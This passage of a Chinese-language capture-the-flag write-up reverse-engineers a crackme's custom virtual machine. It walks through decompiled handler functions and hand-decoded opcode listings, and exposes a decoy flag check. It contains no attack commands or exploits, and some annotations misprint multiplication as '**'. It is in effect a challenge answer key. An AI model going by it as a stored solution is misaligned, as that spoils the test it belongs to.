<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_55BE054DCCD1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">4</span>) = <span class="number">0x12</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) = &amp;unk_55BE056DE060;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">24</span>) = <span class="number">0xF1</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">32</span>) = sub_55BE054DCB5F;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">40</span>) = <span class="number">0xF2</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">48</span>) = sub_55BE054DCA64;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">56</span>) = <span class="number">0xF5</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">64</span>) = sub_55BE054DCAC5;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">72</span>) = <span class="number">0xF4</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">80</span>) = sub_55BE054DC956;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">88</span>) = <span class="number">0xF7</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">96</span>) = sub_55BE054DCA08;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">104</span>) = <span class="number">0xF8</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">112</span>) = sub_55BE054DC8F0;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">120</span>) = <span class="number">0xF6</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">128</span>) = sub_55BE054DC99C;</span><br><span class="line">  qword_55BE056DE2A8 = <span class="built_in">malloc</span>(<span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(qword_55BE056DE2A8, <span class="number">0</span>, <span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>选择置换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_55BE054DCB5F</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = (<span class="type">int</span> *)(*(_QWORD *)(a1 + <span class="number">16</span>) + <span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *(_BYTE *)(*(_QWORD *)(a1 + <span class="number">16</span>) + <span class="number">1LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE1</span>:</span><br><span class="line">      *(_DWORD *)a1 = *((<span class="type">char</span> *)qword_55BE056DE2A8 + *v2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE2</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>) = *((<span class="type">char</span> *)qword_55BE056DE2A8 + *v2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE3</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">8</span>) = *((<span class="type">char</span> *)qword_55BE056DE2A8 + *v2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE4</span>:</span><br><span class="line">      *((_BYTE *)qword_55BE056DE2A8 + *v2) = *(_DWORD *)a1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE5</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">12</span>) = *((<span class="type">char</span> *)qword_55BE056DE2A8 + *v2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xE7</span>:</span><br><span class="line">      *((_BYTE *)qword_55BE056DE2A8 + *v2) = *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) += <span class="number">6LL</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异或</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_55BE054DCA64</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 ^= *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读取数据，并且限制长度为21</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_55BE054DCAC5</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = (<span class="type">const</span> <span class="type">char</span> *)qword_55BE056DE2A8;</span><br><span class="line">  read(<span class="number">0</span>, qword_55BE056DE2A8, <span class="number">0x20</span>uLL);</span><br><span class="line">  dword_55BE056DE2A4 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( dword_55BE056DE2A4 != <span class="number">21</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WRONG!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_55BE054DC956</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>乘法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_55BE054DCA08</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 *= *(_DWORD *)(a1 + <span class="number">12</span>);</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>交换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_55BE054DC8F0</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  *a1 = a1[<span class="number">1</span>];</span><br><span class="line">  a1[<span class="number">1</span>] = v2;</span><br><span class="line">  ++*((_QWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_55BE054DC99C</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 = *(_DWORD *)(a1 + <span class="number">8</span>) + <span class="number">2</span> * *(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">3</span> * *(_DWORD *)a1;</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="加密操作1"><a href="#加密操作1" class="headerlink" title="加密操作1"></a><strong>加密操作</strong>1</h4><p><code>sub_55BE054DCE0B()</code>函数根据<code>unk_55BE056DE060</code>给出的opcode对a1进行加密，知道操作码等于<code>0xF4</code>为止</p>
<p>下面我们需要对opcode进行分析，也是我们解题中最关键的一步</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_55BE054DCE0B</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) = &amp;unk_55BE056DE060;</span><br><span class="line">  <span class="keyword">while</span> ( **(_BYTE **)(a1 + <span class="number">16</span>) != <span class="number">0xF4</span> )</span><br><span class="line">    sub_55BE054DCE6E(a1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据地址选取指令对a1进行操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_556FD909DE6E</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; **(_BYTE **)(a1 + <span class="number">16</span>) != *(_BYTE *)(<span class="number">16</span> * (i + <span class="number">1LL</span>) + a1 + <span class="number">8</span>); ++i )</span><br><span class="line">    ;</span><br><span class="line">  (*(<span class="type">void</span> (__fastcall **)(__int64))(<span class="number">16</span> * (i + <span class="number">1LL</span>) + a1 + <span class="number">16</span>))(a1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把opcode截取到0xF4（在这里你会发现有两段F5-F4），结合动态调试分析，其实一个简单的异或循环，虽然这里写进<code>input[0x20]</code>显得有点奇怪，但是只要看一下<strong>密文对比1</strong>那部分就知道其实这里存储的就是加密后的结果</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">F5 <span class="comment">// read</span></span><br><span class="line">F1 E1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x20] = input[0] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">21</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x21] = input[0x01] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2  </span><br><span class="line">F1 E4 <span class="number">22</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x22] = input[0x02] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">23</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x23] = input[0x03] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x24] = input[0x04] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">25</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x25] = input[0x05] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">26</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x26] = input[0x06] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x27] = input[0x07] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x28] = input[0x08] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">29</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x29] = input[0x09] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">0</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">2</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x2A] = input[0x0A] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">0B</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">2B</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x2B] = input[0x0B] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">2</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x2C] = input[0x0C] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">2</span>D <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x2D] = input[0x0D] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">2</span>E <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x2E] = input[0x0E] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">2F</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x2F] = input[0x0F] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x30] = input[0x10] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">31</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x31] = input[0x11] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">32</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x32] = input[0x12] ^ a1[1]</span></span><br><span class="line">F1 E1 <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">33</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x33] = input[0x13] ^ a1[1]</span></span><br><span class="line">F4 <span class="comment">// ret</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>a1[1]就是之前存储的<code>*(_DWORD *)(a1 + 4) = 0x12;</code></p>
</blockquote>
<h4 id="密文比较1"><a href="#密文比较1" class="headerlink" title="密文比较1"></a><strong>密文比较1</strong></h4><p><code>sub_55BE054DCF83()</code>函数与<code>aFzAmAmFmtSum</code>的指针值（其实就是我们的input）进行比较</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_55BE054DCF83</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; dword_55BE056DE2A4 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)qword_55BE056DE2A8 + i + <span class="number">0x20</span>) != aFzAmAmFmtSum[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;WRONG!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulation?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tips: input is the start&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接用这个值<code>aFzAmAmFmtSum</code>解密发现是假flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] flag:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(_)^<span class="number">0x12</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&#x27;Fz&#123;aM&#123;aM|&#125;fMt~suM !!&#x27;</span>]))</span><br><span class="line"><span class="comment"># [+] flag: This_is_not_flag_233</span></span><br></pre></td></tr></table></figure>

<h4 id="密文比较2"><a href="#密文比较2" class="headerlink" title="密文比较2"></a>密文比较2</h4><p>在假flag上面有一个疑似密文的<code>byte_556FD929F020</code>数据，交叉引用到<code>sub_556FD909DF00()</code>中找到了另外一段密文比较</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_556FD909DF00</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; dword_556FD929F2A4 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)qword_556FD929F2A8 + i) != byte_556FD929F020[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="加密操作2"><a href="#加密操作2" class="headerlink" title="加密操作2"></a>加密操作2</h4><p>在上面进行加密操作1的时候我们发现还有第二段opcode，那我们尝试分析一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">F5 <span class="comment">// read</span></span><br><span class="line">F1 E1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0] = input[0] ^ input[0x01]</span></span><br><span class="line">F1 E1 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x01] = input[0x01] ^ input[0x02]</span></span><br><span class="line">F1 E1 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x02] = input[0x02] ^ input[0x03]</span></span><br><span class="line">F1 E1 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x03] = input[0x03] ^ input[0x04]</span></span><br><span class="line">F1 E1 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x04] = input[0x04] ^ input[0x05]</span></span><br><span class="line">F1 E1 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F2 </span><br><span class="line">F1 E4 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x05] = input[0x05] ^ input[0x06]</span></span><br><span class="line">F1 E1 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E3 <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E5 <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F6 </span><br><span class="line">F7 </span><br><span class="line">F1 E4 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x06] = (input[0x08] + 2 ** input[0x07] + 3 ** input[0x06]) * input[0x0C]</span></span><br><span class="line">F1 E1 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E3 <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E5 <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F6 </span><br><span class="line">F7 </span><br><span class="line">F1 E4 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x07] = (input[0x09] + 2 ** input[0x08] + 3 ** input[0x07]) * input[0x0C]</span></span><br><span class="line">F1 E1 <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E3 <span class="number">0</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E5 <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F6 </span><br><span class="line">F7 </span><br><span class="line">F1 E4 <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x08] = (input[0x0A] + 2 ** input[0x09] + 3 ** input[0x08]) * input[0x0C]</span></span><br><span class="line">F1 E1 <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F8 </span><br><span class="line">F1 E4 <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E7 <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x0D], input[0x13] = input[0x13], input[0x0D]</span></span><br><span class="line">F1 E1 <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F8 </span><br><span class="line">F1 E4 <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E7 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// input[0x0E], input[0x12] = input[0x12], input[0x0E]</span></span><br><span class="line">F1 E1 <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">F1 E2 <span class="number">11</span> <span 